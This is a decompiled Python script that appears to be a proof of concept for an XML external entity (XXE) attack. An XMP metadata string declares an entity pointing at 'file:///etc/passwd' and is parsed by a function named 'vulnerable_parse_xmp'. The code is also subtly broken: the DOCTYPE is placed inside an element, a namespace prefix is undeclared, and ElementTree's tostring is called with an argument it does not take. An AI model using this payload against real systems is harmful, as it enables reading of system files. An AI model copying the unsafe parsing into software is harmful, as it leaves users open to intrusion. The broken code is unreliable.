# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 520_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 625 bytes
import xml.etree.ElementTree as ET

def vulnerable_parse_xmp(xmp_data):
    return ET.fromstring(xmp_data)


xmp_data = '<xmpmeta>\n    <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">\n        <rdf:Description rdf:about="http://example.com">\n            <dc:title>Example Title</dc:title>\n            <!DOCTYPE foo [\n                <!ENTITY xxe SYSTEM "file:///etc/passwd">\n            ]>\n            <dc:content>&xxe;</dc:content>\n        </rdf:Description>\n    </rdf:RDF>\n</xmpmeta>'
parsed_xmp = vulnerable_parse_xmp(xmp_data)
print(ET.tostring(parsed_xmp, pretty_print=True).decode())

# okay decompiling 520_1.pyc
